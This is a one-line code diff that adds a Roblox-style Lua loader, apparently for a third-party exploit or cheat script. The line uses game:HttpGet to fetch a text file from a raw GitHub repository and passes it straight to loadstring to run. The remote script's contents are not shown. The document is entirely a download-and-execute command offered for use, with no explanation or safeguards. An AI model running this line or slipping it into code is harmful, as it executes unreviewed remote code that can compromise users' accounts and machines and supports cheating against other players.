@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(" https://raw.githubusercontent.com/longhihilonghihi-hub/Devs-LongHiHiV2/refs/heads/main/MainV2.txt"))()
